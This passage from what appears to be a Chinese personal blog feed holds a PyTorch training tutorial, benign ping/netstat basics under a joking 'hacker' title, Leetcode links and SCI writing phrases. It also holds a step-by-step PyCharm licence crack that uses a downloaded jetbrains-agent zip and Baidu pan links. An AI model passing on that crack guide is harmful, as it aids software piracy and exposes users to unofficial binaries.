class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token comment" spellcheck="true"># 随机创建一些训练数据</span>x<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_in<span class="token punctuation">)</span>y<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span>w1<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#反向传播需要声明 默认false</span>w2<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>H<span class="token punctuation">,</span>D_out<span class="token punctuation">,</span>requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#反向传播需要声明</span>learning_rate<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">6</span> <span class="token comment" spellcheck="true"># 过拟合，欠拟合</span><span class="token keyword">for</span> it <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Forward pass</span>    y_pred<span class="token operator">=</span>x<span class="token punctuation">.</span>mm<span class="token punctuation">(</span>w1<span class="token punctuation">)</span><span class="token punctuation">.</span>clamp<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mm<span class="token punctuation">(</span>w2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># compute loss</span>    loss <span class="token operator">=</span><span class="token punctuation">(</span>y_pred<span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span>pow<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#和均方差的区别只是一个乘积  computation graph</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 其实是存在一个mean函数的，这里先不管</span>    <span class="token comment" spellcheck="true"># Backward pass</span>    <span class="token comment" spellcheck="true"># compute the gradient</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># update weight of w1 and w2</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        w1 <span class="token operator">-=</span>learning_rate<span class="token operator">*</span>w1<span class="token punctuation">.</span>grad        w2 <span class="token operator">-=</span>learning_rate<span class="token operator">*</span>w2<span class="token punctuation">.</span>grad        w1<span class="token punctuation">.</span>grad<span class="token punctuation">.</span>zero_<span class="token punctuation">(</span><span class="token punctuation">)</span>        w2<span class="token punctuation">.</span>grad<span class="token punctuation">.</span>zero_<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3><span id="wo-men-ke-yi-kan-chu-lai-zi-dong-fan-xiang-chuan-bo-hen-fang-bian">我们可以看出来自动反向传播很方便</span></h3><hr><h2><span id="pytorch-nn-ku-lai-gou-jian-wang-luo">Pytorch:nn库来构建网络</span></h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nnN<span class="token punctuation">,</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>D_out<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token comment" spellcheck="true"># 随机创建一些训练数据</span>x<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_in<span class="token punctuation">)</span>y<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span>model <span class="token operator">=</span>torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>    torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#bias 正则项</span>    torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>H<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># torch.nn.init.normal_(model[0].weight)  # 正态分布输入</span><span class="token comment" spellcheck="true"># torch.nn.init.normal_(model[2].weight)</span><span class="token comment" spellcheck="true"># model=model.cude()</span>loss_fn<span class="token operator">=</span>nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span>reduction<span class="token operator">=</span><span class="token string">'sum'</span><span class="token punctuation">)</span>learning_rate<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">6</span> <span class="token comment" spellcheck="true"># 过拟合，欠拟合</span><span class="token keyword">for</span> it <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Forward pass</span>    y_pred<span class="token operator">=</span>model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># computation graph</span>    <span class="token comment" spellcheck="true"># compute loss</span>    loss <span class="token operator">=</span>loss_fn<span class="token punctuation">(</span>y_pred<span class="token punctuation">,</span>y<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># Backward pass</span>    model<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># update weight of w1 and w2</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> param <span class="token keyword">in</span> model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            param <span class="token operator">-=</span> learning_rate <span class="token operator">*</span>param<span class="token punctuation">.</span>grad</code></pre><h3><span id="wo-men-ke-yi-kan-chu-lai-nn-ku-jiang-mo-xing-kan-cheng-yi-ge-lei-zai-ji-suan-sun-shi-han-shu-shi-geng-jian-dan">我们可以看出来nn库将模型看成一个类，在计算损失函数时更简单</span></h3><hr><h2><span id="pytorch-optim-rang-can-shu-geng-xin-ye-zi-dong-hua">PyTorch:optim 让参数更新也自动化</span></h2><h3><span id="optim-ti-gong-liao-sgd-momentum-rmsprop-adam-deng-mo-xing-you-hua-fang-fa">optim提供了SGD+momentum，RMSProp，Adam等模型优化方法</span></h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nnN<span class="token punctuation">,</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>D_out<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token comment" spellcheck="true"># 随机创建一些训练数据</span>x<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_in<span class="token punctuation">)</span>y<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span>model <span class="token operator">=</span>torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>    torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#bias 正则项</span>    torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>H<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># model=model.cude()</span>loss_fn<span class="token operator">=</span>nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span>reduction<span class="token operator">=</span><span class="token string">'sum'</span><span class="token punctuation">)</span>learning_rate<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">4</span> <span class="token comment" spellcheck="true"># 过拟合，欠拟合 -3 --- -4  比较好</span>optimizer<span class="token operator">=</span>torch<span class="token punctuation">.</span>optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lr<span class="token operator">=</span>learning_rate<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># learning_rate=1e-6 # 过拟合，欠拟合 </span><span class="token comment" spellcheck="true"># optimizer=torch.optim.SGD(model.parameters(),lr=learning_rate)</span><span class="token keyword">for</span> it <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Forward pass</span>    y_pred<span class="token operator">=</span>model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># computation graph</span>    <span class="token comment" spellcheck="true"># compute loss</span>    loss <span class="token operator">=</span>loss_fn<span class="token punctuation">(</span>y_pred<span class="token punctuation">,</span>y<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 其实是存在一个mean函数的，这里先不管</span>    <span class="token comment" spellcheck="true"># Backward pass</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 自动清空</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># update model parameters</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 自动更新参数</span></code></pre><hr><h2><span id="pytorch-zi-ding-yi-nn-modules">PyTorch:自定义nn Modules</span></h2><p>我们可以定义一个模型，这个模型继承自nn.Module类。如果需要定义一个比Sequential模型更加复炸的模型，就需要定义nn.Module模型。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nnN<span class="token punctuation">,</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>D_out<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token comment" spellcheck="true"># 随机创建一些训练数据</span>x<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_in<span class="token punctuation">)</span>y<span class="token operator">=</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">TwoLayerNet</span><span class="token punctuation">(</span>torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义两个函数=定义了模型</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># define the model architecture</span>        super<span class="token punctuation">(</span>TwoLayerNet<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 继承+初始化</span>        self<span class="token punctuation">.</span>linear1<span class="token operator">=</span>torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>bias<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>linear2<span class="token operator">=</span>torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>H<span class="token punctuation">,</span>D_out<span class="token punctuation">,</span>bias<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        y_pred<span class="token operator">=</span>self<span class="token punctuation">.</span>linear2<span class="token punctuation">(</span>self<span class="token punctuation">.</span>linear1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>clamp<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> y_pred  model<span class="token operator">=</span>TwoLayerNet<span class="token punctuation">(</span>D_in<span class="token punctuation">,</span>H<span class="token punctuation">,</span>D_out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># model=model.cude()</span>loss_fn<span class="token operator">=</span>nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span>reduction<span class="token operator">=</span><span class="token string">'sum'</span><span class="token punctuation">)</span>learning_rate<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">4</span> <span class="token comment" spellcheck="true"># 过拟合，欠拟合 -3 --- -4  比较好</span>optimizer<span class="token operator">=</span>torch<span class="token punctuation">.</span>optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lr<span class="token operator">=</span>learning_rate<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># learning_rate=1e-6 # 过拟合，欠拟合 </span><span class="token comment" spellcheck="true"># optimizer=torch.optim.SGD(model.parameters(),lr=learning_rate)</span><span class="token keyword">for</span> it <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Forward pass</span>    y_pred<span class="token operator">=</span>model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># computation graph  =.forward(x)</span>    <span class="token comment" spellcheck="true"># compute loss</span>    loss <span class="token operator">=</span>loss_fn<span class="token punctuation">(</span>y_pred<span class="token punctuation">,</span>y<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span>loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 其实是存在一个mean函数的，这里先不管</span>    <span class="token comment" spellcheck="true"># Backward pass</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 自动清空</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># update model parameters</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 自动更新参数</span></code></pre><h3><span id="zi-ding-yi-zai-hou-mian-chu-li-fu-za-mo-xing-de-shi-hou-you-miao-yong">自定义在后面处理复杂模型的时候有妙用</span></h3><hr><p><strong>finally</strong></p><h1><span id="mu-qian-jian-guo-zui-hao-de-pytorch-xue-xi-shi-pin"></span></h1><h1><span id="you-bu-dong-de-liu-xia-ping-lun-huo-zhe-kan-shi-pin-huo-zhe-bai-du-xie-xie-da-jia">有不懂的留下评论或者看视频，或者百度，谢谢大家！</span></h1>]]></content>
      
      
      <categories>
          
          <category> 神经网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 两层神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最简单的pycharm专业版2089方法---不是之一</title>
      <link href="/2020/10/02/pycharm-activation/"/>
      <url>/2020/10/02/pycharm-activation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="shou-xian-ni-xu-yao-xian-cong-guan-wang-xia-zai-pycharm">首先你需要先从官网下载pycharm</span></h1><p>1.下载安装 PyCharm 2020.1 x64,软件安装过程不详解了<br>百度云分享地址：<br>链接：<a href="https://pan.baidu.com/s/1LOEz_1vRDBVehc9WqknvZg" target="_blank" rel="noopener">https://pan.baidu.com/s/1LOEz_1vRDBVehc9WqknvZg</a><br>提取码：ll94</p><h1><span id="xia-zai-po-jie-zip">下载破解zip</span></h1><p>2.下载 jetbrains-agent-latest.zip 文件<br>百度云分享地址：<br>链接：<a href="https://pan.baidu.com/s/1wduAnfjTAr2Hvb_GeR1olw" target="_blank" rel="noopener">https://pan.baidu.com/s/1wduAnfjTAr2Hvb_GeR1olw</a><br>提取码：bp27</p><h1><span id="chao-ji-po-jie-ma-shang-kai-shi-qing-bu-yao-zha-yan">超级破解马上开始，请不要眨眼！</span></h1><h2><span id="jiang-xia-zai-de-po-jie-zip-fang-dao-xin-jian-de-gong-cheng-wen-jian-xia-mian">将下载的破解zip放到新建的工程文件下面</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201007113647894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="如图"><br><strong>为第二步做准备</strong></p><h2><span id="jiang-po-jie-zip-la-dao-dai-ma-kuang-li-mian">将破解zip拉到代码框里面</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201007113732118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="如图"><br><strong>就是这个范围啦！！！</strong></p><h2><span id="zhi-hou-hui-dan-chu-yi-ge-kuang-dian-restart">之后会弹出一个框，点Restart</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201007113818654.png#pic_center" alt="如图"></p><h2><span id="chong-qi-hou-xuan-ze-wei-wei-pycharm-an-zhuang">重启后选择为为Pycharm安装</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201007113838281.png#pic_center" alt="如图"></p><h2><span id="an-zhuang-cheng-gong-hou-chong-qi-jin-ru-cha-kan-ji-huo-shi-jian">安装成功后重启进入，查看激活时间</span></h2><p>在help–register里面查看<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20201007114027350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="如图"><br><strong>到2089年了，真爽！！！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 代码工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pycharm </tag>
            
            <tag> 激活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客从入门到入狱---一些基本的命令</title>
      <link href="/2020/10/01/hack-simple/"/>
      <url>/2020/10/01/hack-simple/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="yi-xie-ji-ben-de-ming-ling">一些基本的命令</span></h1><h1><span id="ping-ming-ling-wang-luo-zhen-duan-gong-ju">ping命令(网络诊断工具)</span></h1><p>PING （Packet Internet Groper），因特网包探索器，用于测试网络连接量的程序。Ping是工作在 TCP/IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特网报文控制协议）Echo 请求报文，测试目的站是否可达及了解其有关状态</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> www.baidu.com</code></pre><p><strong>其中 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 为你需要请求的网站</strong><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200929185721667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>正常返回四个数据<br>我们可以得到它的电脑IP地址，数据字节，时间（越小速度越快），TTL生存时间（判断操作系统类型）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> www.baidu.com -t</code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020092919025782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><p><strong>一直发送请求，ctrl+c停止</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> -n 12 www.baidu.com </code></pre><p><strong>指定发送的次数</strong></p><hr><h1><span id="netstat-ming-ling">netstat命令</span></h1><p>Netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">netstat</span> -e</code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200929191501396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="3"></p><p>显示以太网，意义不大</p><pre class=" language-bash"><code class="language-bash"><span class="token function">netstat</span> -n</code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200929193156261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="4"></p><p>显示所有网络</p>]]></content>
      
      
      <categories>
          
          <category> 黑客从入门到入狱 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode2020-9月刷题汇总---如何搬起脚边的砖块？</title>
      <link href="/2020/09/28/leetcode-20-09/"/>
      <url>/2020/09/28/leetcode-20-09/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200928154350160.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="惯例图片"></p><h1><span id="leetcode">Leetcode</span></h1><p><a href="https://blog.csdn.net/qq_42136832/article/details/108604827" target="_blank" rel="noopener">Leetcode-队列-20.有效的括号(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108630092" target="_blank" rel="noopener">Leetcode-贪心-56.合并区间(中等)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108647181" target="_blank" rel="noopener">Leetcode-树-100.相同的树(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108647841" target="_blank" rel="noopener">Leetcode-树-101.对称二叉树(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108648595" target="_blank" rel="noopener">Leetcode-树-102.二叉树的层序遍历(中等)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108629474" target="_blank" rel="noopener">Leetcode-贪心-122.买卖股票的最佳时机 II(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108677341" target="_blank" rel="noopener">Leetcode-搜索-130.被围绕的区域(中等)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108668258" target="_blank" rel="noopener">Leetcode-图-133.克隆图(中等)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108716418" target="_blank" rel="noopener">Leetcode-树-538. 把二叉搜索树转换为累加树(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108757085" target="_blank" rel="noopener">Leetcode-树-617. 合并二叉树(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108724958" target="_blank" rel="noopener">Leetcode-树-968. 监控二叉树(困难)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108665452" target="_blank" rel="noopener">Leetcode-图-997.找到小镇的法官(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108666555" target="_blank" rel="noopener">Leetcode-图-1042.不邻接植花(简单)</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108620425" target="_blank" rel="noopener">Leetcode-优先队列-1046.最后一块石头的重量(简单)</a></p><hr><h1><span id="jian-zhi-offer">剑指Offer</span></h1><p><a href="https://blog.csdn.net/qq_42136832/article/details/108784203" target="_blank" rel="noopener">如何才能拾起脚边的砖块？ Offer 09. 用两个栈实现队列</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108838161" target="_blank" rel="noopener">如何才能拾起脚边的砖块？ Offer 22. 链表中倒数第k个节点</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108805192" target="_blank" rel="noopener">如何才能拾起脚边的砖块？ Offer 29. 顺时针打印矩阵</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108850346" target="_blank" rel="noopener">如何才能拾起脚边的砖块？ Offer 42. 连续子数组的最大和</a></p><p><a href="https://blog.csdn.net/qq_42136832/article/details/108757816" target="_blank" rel="noopener">如何才能拾起脚边的砖块？ Offer 64. 求1+2+…+n</a></p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简单题 </tag>
            
            <tag> 剑指offer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCI论文introduction常用句式超全总结</title>
      <link href="/2020/09/15/sci-introduction/"/>
      <url>/2020/09/15/sci-introduction/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="zhi-de-shou-cang">值得收藏</span></h1><h1><span id="introduction-shi-shi-me">introduction是什么？</span></h1><p>introduction是论文中不可或缺的一部分，作者往往在此陈述研究的主题和背景。本文介绍了introduction应当包含的信息，并总结出SCI论文中该部分的常用句式。<br>本文主要总结SCI论文introduction部分的常用句式，总结内容来自国外网站，大家可以写论文的时候，直接从中挑选使用。值得收藏!</p><h1><span id="introduction-de-zuo-yong">introduction的作用？</span></h1><p>introduuction部分再Abstract之后出现。<br>introduction部分应向读者简要概述你的主题和研究的原因。<br>introduction是设置研究背景和给读者留下良好第一印象的最好场所。<br>introduction通常站论文总字数的10-15%，例如，如果你的论文总字数是3000，那么你应该吧introduction定再400个字左右。<br>通常简易再完成论文的其他部分后编写论文的introduction部分。这是因为再看到论文大局之前，很难弄清楚再论文的introduction部分到底要放什么内容。<br>introduction部分应该让读者感觉到你对研究的自信心，并用适当的参考文献来支撑你的观点。阅读introduction部分后，读者必须清楚地了解研究论文地其余部分要做什么。</p><h1><span id="introduction-7-point">introduction-7 point</span></h1><h2><span id="1-zong-ti-jie-shao">1.总体介绍</span></h2><table><thead><tr><th align="left">英文</th><th align="left">翻译</th></tr></thead><tbody><tr><td align="left">Research on __ has a long tradition</td><td align="left">关于__的研究有着悠久的传统。</td></tr><tr><td align="left">For decades, one of the most popular ideas 